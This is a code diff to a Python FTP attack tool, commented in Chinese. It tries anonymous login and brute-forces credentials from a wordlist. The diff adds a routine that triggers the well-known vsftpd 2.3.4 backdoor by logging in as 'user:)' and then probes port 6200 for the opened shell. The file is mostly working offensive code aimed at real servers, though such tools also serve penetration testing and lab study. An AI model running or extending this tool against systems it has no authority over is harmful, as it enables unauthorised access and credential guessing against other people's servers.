@@ -1,6 +1,7 @@
 import ftplib
 from optparse import OptionParser
 import time
+import socket as s
 
 # 进行匿名登录
 def anonLogin(target,port):
@@ -8,10 +9,10 @@ def anonLogin(target,port):
         ftp = ftplib.FTP()
         ftp.connect(target,port)
         ftp.login('anonymous','abcd')
-        print('[+] %s:%d : Anonymous login successful'%(target,port))
+        print('[+] %s:%d : anonymous login successful'%(target,port))
         ftp.quit()
     except :
-        print('[-] %s:%d : Anonymous login failed'%(target,port))
+        print('[-] %s:%d : anonymous login failed'%(target,port))
 
 # 进行爆破登录
 def blastLogin(target,port,file):
@@ -39,6 +40,27 @@ def blastLogin(target,port,file):
     # 未爆破成功
     if not flag:
         print('[-] %s:%s : Blasting login failed'%(target,port))
+
+# 检测是否存在vsftpd_234漏洞
+def vsftpd_234(target,port):
+    try:
+        ftp = ftplib.FTP()
+        ftp.set_debuglevel(1)
+        ftp.connect(target,port)
+        ftp.login('user:)','pass')
+        ftp.quit()
+    except:
+        print('[*] use user:) to open the backdoor')
+    
+    try:
+        tcpClient = s.socket(s.AF_INET,s.SOCK_STREAM)
+        tcpClient.connect((target,6200))
+        tcpClient.close()
+        print('[+] vsftpd_234_backdoor exists')
+    except Exception as e:
+        print(e)
+        print('[-] vsftpd_234_backdoor does not exist')
+
 
 if __name__ == "__main__":
     print("""
@@ -73,8 +95,10 @@ if __name__ == "__main__":
     parse.add_option('-f','--file',dest='file',help='The name and passwd file')
     (options,args) = parse.parse_args()
     if options.target:
-        print('[*] Try anonymous login\n')
+        print('[*] Try anonymous login')
         anonLogin(options.target,options.port)
+        print('\n[*] Test the vsftpd_234_backdoor')
+        vsftpd_234(options.target,options.port)
         if options.file:
             print('\n[*] Try to blast login\n')
             blastLogin(options.target,options.port,options.file)
